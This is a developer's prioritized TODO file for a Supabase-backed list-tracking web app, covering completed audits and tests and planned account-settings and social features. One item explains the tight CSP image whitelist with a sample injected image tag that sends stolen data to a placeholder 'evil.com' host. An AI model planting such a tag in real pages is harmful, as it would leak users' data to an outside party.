# TODO

Short list of concrete next actions, prioritized. Cross items off as you finish them. For the full long-term backlog see [ideas.md](./ideas.md).

---

## 🔴 Top priority — do these next

### 1. ~~Verify schema applied in Supabase~~ ✅ Done 2026-05-14
Tables, policies, and `handle_new_user` trigger all confirmed in the Supabase dashboard.

### 2. ~~End-to-end smoke test~~ ✅ Done 2026-05-14
Sign-up + sign-in + adding items + persistence across sign-out all verified. Email confirmation disabled in Supabase to skip the localhost redirect issue. RLS bonus check (second user can't see first user's items) still untested — flag for any future session if you want to be paranoid.

### 3. ~~`npm audit fix`~~ ✅ Done 2026-05-14
Cleared all 4 vulnerabilities (postcss XSS, ws memory disclosure, 5 vite dev-server CVEs). Required a minor-version bump of vite from 6.3.5 → 6.4.2. Build verified clean afterward. `npm audit` now reports 0 vulnerabilities.

---

## 🟡 Worth a look soon

### 3. Check FormatGuideDialog's Pro Tip box in light mode
Recent `bg-blue-50` → `bg-accent` swap might look too washed out in light mode (very light gray on a white dialog). Open Settings → Account → "Import Format Guide" button. If it looks indistinct, ping me to pick a better token.

### 4. Decide on dark-mode polish (or skip)
Two items in [ideas.md](./ideas.md) under "Architecture":
- Wrapping content sections in `<Card>` for proper theming
- Full theme-token sweep across MainContent/ListView/etc.

Both are bigger UI changes. Only worth doing if you want dark mode to be a flagship visual feature. Otherwise the current state (dark sidebar + dark page bg in both modes) is fine.

---

## 🟢 Nice to have (no rush)

### 5. Mobile view completion
Earlier commit said "working on mobile view" — components exist in `src/components/mobile/` but weren't finished. Tackle when you have mobile users or before publishing.

### 6. ~~Toast/banner on Supabase failures~~ ✅ Done 2026-05-14
`usePreferences.ts` upsert + load and `useAuth.ts` profile load now toast on real failures instead of silently `console.error`-ing. PGRST116 (no rows) is still treated as expected (new users with no preferences row, or sign-up trigger hasn't fired yet) and falls through to defaults silently.

### 7. Add tests for `utils/csv.ts`
The CSV utility is a perfect first test target — pure functions, clear inputs/outputs. Whenever you regress a CSV import this is the obvious thing to set up.

### 8. Account settings: change display name
Add a "Display name" field to Settings → Account that updates `profiles.name`. Trivial — one input, one `supabase.from('profiles').update({ name })` call, toast on success/failure. Demo mode can update locally (mockUsers).

### 9. Account settings: change email (for email-based accounts only)
Add a "Change email" flow that calls `supabase.auth.updateUser({ email: newEmail })`. Supabase sends confirmation to BOTH old and new addresses by default. Hide this option for username-only accounts (no real email to send to — detect via `isSyntheticEmail`). Medium effort.

### 10. Account settings: reset password
- For email accounts: trigger `supabase.auth.resetPasswordForEmail(email, { redirectTo })` and add a password-reset landing page that calls `updateUser({ password })`. Needs `redirectTo` configured for the deployed URL.
- For username-only accounts: no recovery is possible (no email to send to). Show a clear "not available — passwords for username-only accounts cannot be reset." If users want to enable recovery, offer to add an email to their account first (depends on #9). Medium-to-high effort.

### 11. Expand the CSP `img-src` whitelist when adding new poster sources
`index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.

---

## 🌱 New feature ideas (longer-term)

Detailed write-ups for all three are in [ideas.md](./ideas.md) under "Features":

- **Username-only signup** (no email required) — synthetic-email auth pattern. Schema sketch + recovery-code tradeoffs already documented. Mid-effort (a few hours), single-session feasible.
- **Friend system (view-only list sharing)** — friend requests, view friends' lists read-only. Multi-day feature.
- **Shared / collaborative lists** — multiple users editing the same list together. Depends on the friend system being built first. Multi-day feature.

All three require Supabase schema additions. Don't start without a clear plan — open ideas.md before kicking off.

---

_Last touched: 2026-05-14 (post smoke-test)_
